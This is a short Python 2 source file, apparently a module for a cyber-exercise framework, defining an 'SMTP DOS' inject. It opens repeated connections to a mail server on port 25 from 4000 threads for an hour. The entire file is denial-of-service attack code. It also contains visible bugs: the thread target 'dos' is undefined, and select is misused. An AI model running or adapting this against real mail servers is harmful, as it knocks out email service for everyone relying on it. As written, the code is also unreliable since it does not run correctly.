import socket
import time
import random
import threading
import select

class smtp_dos():
    def __init__(self):
        self.variables = {'src_ip':''}
        self.name = "SMTP DOS"
        self.description = "An inject that performs a denial of service attack on SMTP."
        self.mail_domain_name = 'sav-gw.uct.jcor'

    def connect(self):
        s = socket.socket()
        s.bind((self.src_ip,0))
        s.connect((self.mail_domain_name, 25))
        return s

    def dos(self):
        while True:
            s = self.connect()
            if select.select([],[],[s]):
                s = self.connect()
            time.sleep(1)

    def range(self, **kwargs):
        self.src_ip = kwargs['src_ip']
        threads = []
        for i in xrange(4000):
            t = threading.Thread(target=dos)
            t.daemon = True
            t.start()
            threads.append(t)
        # sleep 3600 seconds (1 hour)
        time.sleep(60*60)

    def run(self, **kwargs):
        self.range(**kwargs)

